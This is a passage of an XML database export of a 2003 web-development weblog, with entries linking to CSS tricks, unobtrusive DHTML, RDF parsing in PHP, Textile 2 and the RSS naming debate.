 &lt;li&gt;&lt;a href=&quot;http://www.markschenk.com/cssexp/&quot;&gt;CSS/Exp&lt;/a&gt; is Mark Schenk's collection of CSS experiments which show off some pretty advanced &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, much of which oonly works in Opera due to its full support of generated content.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.literarymoose.info/=/css.html&quot;&gt;CSS Destroy&lt;/a&gt; is a similar collection, with an emphasis on pushing &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; to its limits and beyond.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-07-02 16:54:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1058</field>
		<field name="title">More unobtrusive DHTML</field>
		<field name="slug">cascianoZeitgeist</field>
		<field name="body">&lt;p&gt;I've talked about unobtrusive &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; &lt;a href=&quot;http://simon.incutio.com/archive/2003/01/11/dom2AlmostRecommended&quot; title=&quot;DOM2 almost recommended&quot;&gt;before&lt;/a&gt;, and here's a superb example of it in practise from Chris Casciano. His &lt;a href=&quot;http://placenamehere.com/zeitgeist/&quot;&gt;zeitgeist&lt;/a&gt; is enhanced by some clever javascript which hides and reveals tables of data when certain page elements are clicked. View source, and you'll see that the document contains only structural &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;, with no embedded javascript at all. The special behaviour is added by an external Javascript file which adds the necessary event handlers when it loads, based on the structure of the existing document. This approach maintains the usability of the information in a non-javascript supporting environment, while seriously enhancing the maintainaility of the page as new structural elements can be added to the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; which will pick up the special behaviour without any further modification to the javascript needed.&lt;/p&gt;</field>
		<field name="created">2003-07-02 18:56:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1059</field>
		<field name="title">Norwegian Hixie</field>
		<field name="slug">norwegianHixie</field>
		<field name="body">&lt;p&gt;Congratulations Hixie on his &lt;a href=&quot;http://ln.hixie.ch/?start=1057004468&amp;amp;count=1&quot; title=&quot;Zero&quot;&gt;new job&lt;/a&gt; at Opera software, in sunny Norway. That's a pretty exciting opportunity. Does this mean he'll be contributing less to the Mozilla project? (Dave Hyatt has managed to keep working on it despite his move to Apple).&lt;/p&gt;</field>
		<field name="created">2003-07-02 19:26:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1060</field>
		<field name="title">RDF and PHP</field>
		<field name="slug">rdfAndPhp</field>
		<field name="body">&lt;p&gt;If you're still struggling to get to grips with what &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; is actually for, you could do worse than read this guide to &lt;a href=&quot;http://www.semanticplanet.com/2003/05/parsingFOAFWithPHP.html&quot;&gt;Parsing FOAF with PHP&lt;/a&gt;. It shows how the &lt;acronym title=&quot;Friend Of A Friend&quot;&gt;FOAF&lt;/acronym&gt; flavour of &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; can be processed using the &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; &lt;a href=&quot;http://www.wiwiss.fu-berlin.de/suhl/bizer/rdfapi/&quot;&gt;RAP library&lt;/a&gt;, and in doing so demonstrates how &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; documents are built from collections of triples anmd how these triples can be queried to extract useful information. If you've ever used Prolog, &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; is actually a very similar concept.&lt;/p&gt;</field>
		<field name="created">2003-07-03 00:19:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1061</field>
		<field name="title">Scribbling.net web site tips</field>
		<field name="slug">scribbling</field>
		<field name="body">&lt;p&gt;Some useful tips from &lt;a href=&quot;http://www.scribbling.net/&quot;&gt;Scribbling.net&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.scribbling.net/entry/310/&quot;&gt;Nine things you can do to make your web site better&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.scribbling.net/entry/394/&quot;&gt;Help the Googlebot understand your web site&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I also really like the subtle visual effect in that site's header where the tail of the 'g' overlaps the sub-heading.&lt;/p&gt;</field>
		<field name="created">2003-07-03 08:01:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1062</field>
		<field name="title">Accessing cookies with application/xml+xhtml</field>
		<field name="slug">accessingCookies</field>
		<field name="body">&lt;p&gt;I'm completely stuck on this one. When serving &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; documents to Mozilla as &lt;code&gt;application/xml+xhtml&lt;/code&gt;, the available &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; is for an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; document rather than an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; document. This means it's missing the document.cookie object normally used to access cookies from Javascript. I can't figure out how you access cookies without it (I've searched &lt;a href=&quot;http://bugzilla.mozilla.org/&quot;&gt;Bugzilla&lt;/a&gt; to no avail). Anyone got any ideas? I sure wish the Mozilla project provided better documentation on this stuff.&lt;/p&gt;</field>
		<field name="created">2003-07-03 09:50:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1063</field>
		<field name="title">Nail, Bang, Head</field>
		<field name="slug">nailBangHead</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.7nights.com/asterisk/archives/focus_series_the_user.php&quot; title=&quot;FOCUS Series - The User&quot;&gt;D. Keith Robinson&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.7nights.com/asterisk/archives/focus_series_the_user.php&quot;&gt;&lt;p&gt;
I feel that all to often those of us who spend every day working, surfing, reading and thinking about the Web lose sight of the fact that it's still a new medium and there are lots of folks out there who don't spend every day working, surfing, reading and thinking about the Web. This could be newbies, your clients and stakeholders or any number of people who might have a vested interest in understanding what makes the Web tick.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;This is something that can be extremely difficult to remember; by default, anyone involved in web development is themselves an expert web user. Watching less experienced people using the web can be incredibly enlightening (especially the things that look like real howlers, like the first time you see someone typing a URL in to a search engine because they haven't figured out the difference between that and the browser address bar).&lt;/p&gt;

&lt;p&gt;I maintain a strong focus on usability in all of my web projects, but I almost always consider usability from the point of view of an expert user. Figuring out how to deal with people who have very little experience of the web can be a lot harder.&lt;/p&gt;</field>
		<field name="created">2003-07-04 00:21:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1064</field>
		<field name="title">Simple Python Sockets</field>
		<field name="slug">simplyPythonSockets</field>
		<field name="body">&lt;p&gt;Moshe Zadka: &lt;a href=&quot;http://moshez.org/discuss/msg00196.html&quot;&gt;Networking for non-programmers&lt;/a&gt; (and a &lt;a href=&quot;http://moshez.org/discuss/msg00197.html&quot;&gt;follow up&lt;/a&gt;), via &lt;a href=&quot;http://zephyrfalcon.org/weblog/arch_d7_2003_06_28.html#e265&quot; title=&quot;Thursday roundup&quot;&gt;Hans Nowak&lt;/a&gt;. A nice gently introduction to sockets, with example code using Python's socket library.&lt;/p&gt;</field>
		<field name="created">2003-07-04 16:02:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1065</field>
		<field name="title">Diagonal shapes with CSS</field>
		<field name="slug">diagonalCSS</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.infimum.dk/HTML/slantinfo.html&quot;&gt;Information on Border Slants&lt;/a&gt; (via &lt;a href=&quot;http://www.paranoidfish.org/links/2003/07/&quot; title=&quot;paranoidfish.org/links July 2003&quot;&gt;Paul Hammond&lt;/a&gt;). Border slants are the effect whereby diagonal lines can be created using pure &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, by taking advantage of the fact that thick borders around a box meet at an angle. This article describes the effect in detail and shows how it can be used to achieve a number of interesting shapes, then goes on to show off with an impressive &lt;a href=&quot;http://www.infimum.dk/HTML/heartArt.html?text=Slants&quot;&gt;Valentine's Day Heart&lt;/a&gt;. See also Tantek's awesome &lt;a href=&quot;http://www.tantek.com/map.html&quot;&gt;pentagon site map&lt;/a&gt; and &lt;a href=&quot;http://www.tantek.com/CSS/Examples/polygons.html&quot;&gt;A Study of Regular Polygons&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-07-04 18:03:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1066</field>
		<field name="title">XML-RPC Errata</field>
		<field name="slug">xmlrpcErrata</field>
		<field name="body">&lt;p&gt;Fredrik Lundh: &lt;a href=&quot;http://www.effbot.org/zone/xmlrpc-errata.htm&quot;&gt;Unofficial XML-RPC Errata&lt;/a&gt;, a work in progress. It's good to see that the unicode limitation has finally been cleaned up. What would be &lt;em&gt;really&lt;/em&gt; useful is if someone could work out a list of all of the older implementations that only support &lt;acronym title=&quot;American Standard Code for Information Interchange&quot;&gt;ASCII&lt;/acronym&gt; strings.&lt;/p&gt;</field>
		<field name="created">2003-07-04 18:51:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1067</field>
		<field name="title">Reintroducing HTML</field>
		<field name="slug">reintroducingHTML</field>
		<field name="body">&lt;p&gt;Jay Small: &lt;a href=&quot;http://smallinitiatives.com/journal60_0_1_0_C.html&quot;&gt;Reintroduce yourself to HTML&lt;/a&gt;. A call to web authors everywhere to go back to their roots and realise that &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; is not something that should be avoided. He makes some great points, such as the following:&lt;/p&gt;

&lt;blockquote cite=&quot;http://smallinitiatives.com/journal60_0_1_0_C.html&quot;&gt;
&lt;p&gt;&lt;strong&gt;Knowing HTML is understanding document structure:&lt;/strong&gt; That return to the roots of the language means you can focus your HTML learning on the tags and styles that explain document structure -- paragraphs, lists, headings, sections, images, captions. You know, the content types you work with every day.&lt;/p&gt;

&lt;p&gt;HTML logic is quite simple, and the markup quickly makes sense to writers and editors, in particular -- because the language is set up much the way you have to think to put one word in front of another competently.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;From a site called &lt;a href=&quot;http://smallinitiatives.com/&quot;&gt;Small Initiatives&lt;/a&gt;, which I'd never seen before but I will definitely be revisiting. Lots of great content under the banner of &quot;Sensible Internet Design&quot;.&lt;/p&gt;</field>
		<field name="created">2003-07-04 21:29:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1068</field>
		<field name="title">Browser innovation is anything but dead</field>
		<field name="slug">browserInnovation</field>
		<field name="body">&lt;p&gt;Rafe Colburn &lt;a href=&quot;http://rc3.org/cgi-bin/less.pl?arg=5372&quot; title=&quot;Knowing when to shut up&quot;&gt;slams&lt;/a&gt; Marc Andreessen for his &lt;a href=&quot;http://reuters.com/newsArticle.jhtml?type=internetNews&amp;amp;storyID=3020749&quot; title=&quot;Netscape Founder Says Web Browsing Innovation Dead&quot;&gt;recent comments&lt;/a&gt; regarding browser innovation. Marc thinks browser innovation has been dead for the last five years. To make a statement like that he must have missed out on Mozilla, Firebird, Safari, Opera and all the other Gecko variants. Which leads to the worrying conclusion that he's either still using Netscape 4 or (even worse) he browses with &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;!&lt;/p&gt;</field>
		<field name="created">2003-07-04 21:51:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1069</field>
		<field name="title">Custom XML templating with PHP</field>
		<field name="slug">customXML</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.phpbuilder.com/columns/scheffler20030325.php3&quot;&gt;Dynamic XML conversion using the SAX parser and a stack&lt;/a&gt; is the best new article I've seen on &lt;a href=&quot;http://www.phpbuilder.com/&quot;&gt;PHPBuilder&lt;/a&gt; in a very long time. It introduces several interesting ideas. The first is something I've been thinking about for a while now: using PHP's output buffering to implement a kind of templating system so that all of the scripts in a system just have to generate an intermediate content type, then the output buffering function adds on the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; framework and finalises the page. The second idea is ingenious: invent &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; elements to represent specific behaviours, then handle them with a &lt;acronym title=&quot;Simple API for XML&quot;&gt;SAX&lt;/acronym&gt; before the page is displayed. Here's some example code from the article:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.phpbuilder.com/columns/scheffler20030325.php3?page=2&quot;&gt;&lt;pre class=&quot;xml&quot;&gt;
&amp;lt;doc title=&quot;Pizza menu&quot; bgcolor=&quot;lightblue&quot;&amp;gt;
	&amp;lt;bigheadline&amp;gt;
		Pizza Palace - Our Menu for  &amp;lt;dayofweek /&amp;gt;
	&amp;lt;/bigheadline&amp;gt;
	&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;
	&amp;lt;b&amp;gt;Buon appetito!!!&amp;lt;/b&amp;gt;
	&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;
	
	&amp;lt;nicebox bordercolor=&quot;green&quot;&amp;gt;
		&amp;lt;product id=&quot;0&quot; /&amp;gt;&amp;lt;br /&amp;gt;
		&amp;lt;product id=&quot;1&quot; /&amp;gt;&amp;lt;br /&amp;gt;
		&amp;lt;product id=&quot;2&quot; /&amp;gt;&amp;lt;br /&amp;gt;
		&amp;lt;product id=&quot;3&quot; /&amp;gt;&amp;lt;br /&amp;gt;
		&amp;lt;product id=&quot;4&quot; /&amp;gt;&amp;lt;br /&amp;gt;
	&amp;lt;/nicebox&amp;gt;
&amp;lt;/doc&amp;gt;
&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p&gt;The tutorial describes a full implementation to make use of the custom tags demonstrated above. It's advocating a full &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; where pages are described using a custom &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; format, but the idea could be used in a whole load of different ways. I touched on this approach with my &lt;a href=&quot;http://simon.incutio.com/archive/2003/06/17/theHolyGrail&quot; title=&quot;Easier form validation with PHP&quot;&gt;Form Validation&lt;/a&gt; prototype but this really shows how much further the concept can be taken. Best of all, the performance hit should be pretty minimal due to the &lt;a href=&quot;http://simon.incutio.com/archive/2002/07/25/warpFactorPhp&quot; title=&quot;Warp factor PHP&quot;&gt;absurd speed&lt;/a&gt; of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; functions.&lt;/p&gt;</field>
		<field name="created">2003-07-04 22:44:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1070</field>
		<field name="title">Food for thought</field>
		<field name="slug">foodForThought</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.internetisshit.org/&quot;&gt;The internet is shit&lt;/a&gt;. Food for thought, via &lt;a href=&quot;http://www.benhammersley.com/dparchives/004205.html&quot; title=&quot;The Internet is Shit (.org)&quot;&gt;Ben Hammersley&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-07-06 14:07:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1071</field>
		<field name="title">Google oddities</field>
		<field name="slug">googleOddities</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://scriptingnews.userland.com/2003/07/06#When:6:37:37AM&quot;&gt;Dave Winer&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://scriptingnews.userland.com/2003/07/06#When:6:37:37AM&quot;&gt;
&lt;p&gt;For several months this Google &lt;a href=&quot;http://www.google.com/search?hl=en&amp;amp;ie=UTF-8&amp;amp;oe=UTF-8&amp;amp;q=rss&quot;&gt;search&lt;/a&gt;
would turn up a UserLand page as the number one hit. Today it's not in
the first ten pages. Must be a bug. Or do they play games with their
search engine? Straight question. It's really hard to believe it just
fell off the Web in the last few days. And while I'm at it, I don't
like it that they label my older specs as deprecated (in caps no less). [...]
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;It is pretty strange that the &lt;a href=&quot;http://backend.userland.com/rss&quot;&gt;RSS 2.0 specification&lt;/a&gt; isn't listed on the first page. There's an interesting &lt;a href=&quot;http://www.webmasterworld.com/forum3/15026.htm&quot; title=&quot;Google&amp;apos;s 2 indexes &amp;amp; you&quot;&gt;thread on WebMasterWorld&lt;/a&gt; at the moment about recent strange behaviour in Google's ranking algorithms, with a number of guesses as to the cause. As to the second complaint, google's descriptions of pagse are generall pulled from the &lt;a href=&quot;http://dmoz.org/&quot;&gt;Open Directory&lt;/a&gt;. Sure enough, take a look at &lt;a href=&quot;http://directory.google.com/Top/Reference/Libraries/Library_and_Information_Science/Technical_Services/Cataloguing/Metadata/RDF/Applications/RSS/Specifications/?il=1&quot; title=&quot;RSS &amp;gt; Specifications&quot;&gt;this page&lt;/a&gt; listing RSS specifications, &lt;del&gt;currently maintained by &lt;a href=&quot;http://dmoz.org/profiles/bhammersley.html&quot; title=&quot;Editor:  bhammersley&quot;&gt;Ben Hammersley&lt;/a&gt;&lt;/del&gt; &lt;ins&gt;currently seeking a new editor (see &lt;a href=&quot;http://simon.incutio.com/archive/2003/07/06/googleOddities#comment3&quot;&gt;this comment&lt;/a&gt;)&lt;/ins&gt;.&lt;/p&gt;</field>
		<field name="created">2003-07-06 15:39:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1072</field>
		<field name="title">overflow: hidden</field>
		<field name="slug">overflowHidden</field>
		<field name="body">&lt;p&gt;I've never really played with the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; &lt;code class=&quot;css&quot;&gt;overflow&lt;/code&gt; property, partly because I don't trust it to work in a decent number of browsers. &lt;a href=&quot;http://www.hebig.org/blog/titlepic.php&quot;&gt;Haiko Hebig's Title Pictures&lt;/a&gt; show off a clever use for the property to display varying amounts of an image depending on the user's browser size; what's more, I've tested it and it works in Gecko, Opera 7 and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6 (no &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;5 to test on at the moment).&lt;/p&gt;
</field>
		<field name="created">2003-07-06 18:46:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1073</field>
		<field name="title">Fixing an IE scrolling glitch</field>
		<field name="slug">fixingTheGlitch</field>
		<field name="body">&lt;p&gt;Mike Golding &lt;a href=&quot;http://www.notestips.com/80256B3A007F2692/1/NAMO5GU36H&quot;&gt;offers a solution&lt;/a&gt; to the slightly odd &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; bug whereby divs in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; layout sites suffer glitches as the page is scrolled (from December 2002):&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.notestips.com/80256B3A007F2692/1/NAMO5GU36H&quot;&gt;
&lt;p&gt;The problem is in the way that Internet Explorer 6 renders its layered elements. A DIV that has nothing behind it on the page is rendered bit by bit (for efficiency) as the page scrolls. If the scrolling is anything other than 100% smooth the rendering fails leaving the sorts of glitches shown above.&lt;/p&gt;

&lt;p&gt;The simple solution to this is put something behind the DIV(s) that are causing the problem. When the DIV(s) have something behind them IE appears to change the way in which it renders them as the page scrolls. Now IE will re-render the entire DIV as the page scrolls, less efficient but it guarantees the entire DIV is displayed correctly. [...]&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2003-07-06 20:02:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1074</field>
		<field name="title">John Robb leaves UserLand</field>
		<field name="slug">theWeblogNetwork</field>
		<field name="body">&lt;p&gt;From &lt;a href=&quot;http://scriptingnews.userland.com/2003/07/07#When:1:21:54PM&quot;&gt;Scripting.com&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://scriptingnews.userland.com/2003/07/07#When:1:21:54PM&quot;&gt;&lt;p&gt;
Some news: John Robb is leaving UserLand. This is part of a bigger transition, one that we're not ready to talk about yet. It should be, net-net, good news for Manila and Radio users, and for the weblog community. We weren't ready to announce, John surprised us by writing about his departure on his weblog. He's a surprising guy.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;John's &lt;a href=&quot;http://jrobb.userland.com/&quot;&gt;weblog&lt;/a&gt; seems to be offline at the moment, but you can see his &lt;a href=&quot;http://www.feedster.com/cache.php?id=2876569&quot;&gt;parting note&lt;/a&gt; in the Feedster cache. It seems he's going to be dedicating some time to the Weblog Network, &lt;a href=&quot;http://www.feedster.com/cache.php?id=2263386&quot;&gt;described here&lt;/a&gt; (another cached entry). Interesting stuff.&lt;/p&gt;</field>
		<field name="created">2003-07-07 22:36:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1075</field>
		<field name="title">Handling dates in Java</field>
		<field name="slug">javaDates</field>
		<field name="body">&lt;p&gt;I could have really done with this a few months ago: &lt;a href=&quot;http://www.onjava.com/pub/a/onjava/2003/06/05/java_calendar.html&quot;&gt;Making Sense of Java's Dates&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-07-07 22:41:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1076</field>
		<field name="title">More Java</field>
		<field name="slug">moreJava</field>
		<field name="body">&lt;p&gt;Simon Brunning has a great selection of &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000783.html&quot;&gt;online Java resources&lt;/a&gt;. I should really give it its own category.&lt;/p&gt;</field>
		<field name="created">2003-07-07 22:48:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1077</field>
		<field name="title">Linus Interview</field>
		<field name="slug">linusInterview</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.bayarea.com/mld/mercurynews/6238207.htm&quot;&gt;Linux creator an open source&lt;/a&gt;, an interesting interview with Linus Torvalds covering the IBM/SCO case, leaving Transmeta and his opinions of Silicon Valley.&lt;/p&gt;</field>
		<field name="created">2003-07-07 23:14:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1078</field>
		<field name="title">Programming Language People</field>
		<field name="slug">beardsAreTheWay</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.joegrossberg.com/archives/000754.html&quot; title=&quot;The People of Programming Languages&quot;&gt;Joe Grossberg&lt;/a&gt;, Chris Rathman's &lt;a href=&quot;http://www.angelfire.com/tx4/cus/people/&quot;&gt;collection of mugshots&lt;/a&gt; of the creators of a large number of important programming languages. There's actually a surprisingly low beard quotient (although it's nice to see Unix/C gurus Ken Thompson, Dennis M. Ritchie and Brian Kernigan all sport a decent amount of facial hair). On a related note, I recently came across &lt;a href=&quot;http://99-bottles-of-beer.ls-la.net/&quot;&gt;99 Bottles of Beer&lt;/a&gt;, a simple program implemented in 571 different languages. Fascinating stuff.&lt;/p&gt;</field>
		<field name="created">2003-07-08 21:26:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1079</field>
		<field name="title">Textile 2</field>
		<field name="slug">textile2</field>
		<field name="body">&lt;p&gt;Textile 2 is now &lt;a href=&quot;http://www.textism.com/tools/textile/&quot; title=&quot;Textism: Textile&quot;&gt;available for testing&lt;/a&gt;, courtesy of Dean Allen. Textile is one of the more popular structured-text style markup languages, which translate a simple markup language in to &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;. What made the original Textile special was that it concentrated squarely on structural markup, providing intuitive shortcuts for most structural &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; elements. Textile 2 takes this further, but also introduces a number of presentational effects such as block alignment. Beta &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; code is available in addition to the demo.&lt;/p&gt;

&lt;p&gt;That said, the killer feature of Textile 2 in my opinion is the fact that it has been developed as a collaborative effort between Dean Allen and Brad Choate. Brad created a Perl port of the original Textile (Mark Pilgrim &lt;a href=&quot;http://diveintomark.org/projects/pytextile/&quot; title=&quot;PyTextile&quot;&gt;did the same thing&lt;/a&gt; for Python) but this time round they have been &lt;a href=&quot;http://www.bradchoate.com/past/001653.php&quot; title=&quot;Thither MT-Textile 2 (beta)&quot;&gt;working together&lt;/a&gt; to define the format. If they are successful, Textile could become a useful mini-standard for authoring structural markup. At any rate, since Textile is intended to be a shorthand technique to complement &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; rather than replace it it is well worth a look.&lt;/p&gt;</field>
		<field name="created">2003-07-09 00:08:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1080</field>
		<field name="title">Filtering AOL</field>
		<field name="slug">filteringAOL</field>
		<field name="body">&lt;p&gt;Burningbird &lt;a href=&quot;http://weblog.burningbird.net/fires/001328.htm&quot; title=&quot;I remember Usenet&quot;&gt;starts a discussion&lt;/a&gt; on how much harm the &lt;a href=&quot;http://www.buzzmachine.com/archives/2003_07.html#004146&quot; title=&quot;AOL blogs!&quot;&gt;addition of AOL users&lt;/a&gt; will cause to the blogging eco-system. She compares this development to the chaos caused when &lt;acronym title=&quot;America OnLine&quot;&gt;AOL&lt;/acronym&gt; users were first introduced to Usenet. I don't see that there's a problem. To my mind, the thing that separates blogging from the many other forms of internet discussion (forums, Usenet, mailing lists etc) is that it comes with its own built in filtering mechanisms. I'll take myself as an example. While I don't use an aggregator, I &lt;em&gt;do&lt;/em&gt; use my blogroll to keep track of roughly 70 bloggers who have a very high signal to noise ratio. Through them, I am frequently directed to other bloggers of a similar calibre. I've seen it claimed that there are over half a million blogs on the 'net, but the social network I maintain through my blogroll means that while I only see a fraction of those, that fraction tracks most of the information of interest to me.&lt;/p&gt;

&lt;p&gt;If &lt;acronym title=&quot;America OnLine&quot;&gt;AOL&lt;/acronym&gt; add another million blogs that don't carry information of interest to me, that's fine; I probably won't even notice. Not until one of them posts something interesting, and one of the 70+ blogs I read points me in their direction.&lt;/p&gt;
</field>
		<field name="created">2003-07-09 00:25:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1081</field>
		<field name="title">CSS drop shadows</field>
		<field name="slug">linkPropogation</field>
		<field name="body">&lt;p&gt;Yet another groovy &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; demo: &lt;a href=&quot;http://nontroppo.org/test/shadow.html&quot;&gt;Drop shadow effects&lt;/a&gt; using only two nested divs and an alpha-transparent &lt;acronym title=&quot;Portable Network Graphics&quot;&gt;PNG&lt;/acronym&gt;. They look passable in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; as well. Another gem from Paul Hammond's &lt;a href=&quot;http://www.paranoidfish.org/links/&quot; title=&quot;paranoidfish.org/links&quot;&gt;link blog&lt;/a&gt;. Incidentally, Paul has written up some &lt;a href=&quot;http://www.paranoidfish.org/notes/2003/07/08/0924&quot; title=&quot;Chaos Theory and Link Propogation&quot;&gt;interesting observations&lt;/a&gt; on how a previous item from his link blog spread itself around the 'net after I linked to it a few days ago.&lt;/p&gt;</field>
		<field name="created">2003-07-09 00:32:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1082</field>
		<field name="title">Throwing your money around</field>
		<field name="slug">throwingMoney</field>
		<field name="body">&lt;p&gt;Adam Curry is a dangerous man: He's &lt;a href=&quot;http://www.blognewsnetwork.com/members/0000001/2003/07/07.html#a4052&quot; title=&quot; Taking a stand on RSS&quot;&gt;throwing $10,000&lt;/a&gt; at a problem he clearly doesn't understand. Quote from &lt;a href=&quot;http://radio.weblogs.com/0001014/2003/06/29.html#a3981&quot; title=&quot;my $0.02 on the rss debate&quot;&gt;June 29th&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://radio.weblogs.com/0001014/2003/06/29.html#a3981&quot;&gt;&lt;p&gt;
I wonder if netscape came up with the Really Simple Syndication when they hijacked the name for what they called rss1.0.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Anyone who's been following &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; even a little bit should know that Netscape had absolutely nothing to do with &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; 1.0 - they defined &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; 0.91 and that was it. Netscape certainly didn't hijack the name, and it was Dave Winer who came up with &quot;Really Simple Syndication&quot;.&lt;/p&gt;

&lt;p&gt;Despite questionable understanding of the situation, Adam is taking a stand by promising to spread $10,000 around in payments to aggregator authors to include him as a default feed, but only if they omit support for (N)Echo. As Rafe Colburn &lt;a href=&quot;http://rc3.org/cgi-bin/less.pl?arg=5385&quot; title=&quot;Wrong in so many ways&quot;&gt;points out&lt;/a&gt;, even if you assume a complete understanding of the issues behind the creation of (N)Echo, this simply doesn't make sense.&lt;/p&gt;</field>
		<field name="created">2003-07-09 01:18:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1083</field>
